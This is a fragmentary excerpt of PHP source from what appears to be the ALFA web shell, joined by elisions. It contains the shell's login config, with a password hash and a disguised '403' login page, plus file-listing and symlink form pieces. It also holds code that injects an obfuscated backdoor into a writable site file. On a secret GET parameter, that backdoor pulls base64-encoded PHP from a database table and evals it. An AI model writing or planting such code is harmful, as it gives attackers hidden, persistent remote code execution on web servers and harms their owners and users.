...
$GLOBALS['oZgNypoPRU'] = array(
    'username' => 'alfa',
    'password' => 'b4b4f1aa25939dcf51cf39d1dded0895',
    'safe_mode' => '1',
    'login_page' => '403',
    'show_icons' => '1',
...
$code = '<?php if(isset($_GET["alfa"])&&$_GET["alfa"]=="'.$key.'"){$conn=mysqli_connect("'.str_replace('"','\"',$dbhost).'","'.str_replace('"','\"',$dbuser).'","'.str_replace('"','\"',$dbpw).'","'.str_replace('"','\"',$dbname).'");$q=mysqli_query($conn,"SELECT `code` FROM ysm LIMIT 0,1");$r=mysqli_fetch_assoc($q);$func="cr"."ea"."te_"."fun"."ction";$x=$func("\$c","e"."v"."al"."(\'?>\'.base"."64"."_dec"."ode(\$c));");$x($r["code"]);exit;}?>';
if(@is_file($file)&&@is_writable($file)){
@mysqli_query($conn,'DROP TABLE `ysm`');
@mysqli_query($conn,'CREATE TABLE IF NOT EXISTS ysm (
    id INT AUTO_INCREMENT PRIMARY KEY,
    code LONGTEXT NOT NULL
)');
@mysqli_query($conn,'INSERT INTO `ysm` (id, code) VALUES(1, "")');
...
$dirs[] = array_merge($tmp, array('type' => 'dir'));
	...
	if($dirContent[$i]["type"]=="file"){$files[] = array_merge($tmp, array('type' => 'file'));
	}else{
...
<input type="text" name="symfile" placeholder="Example : alfa.txt" size="60"/><p><input type="submit" value=" " name="symlink" /></p></form></center>';
$path = $_POST['alfa5'];
$symname = $_POST['alfa6'];
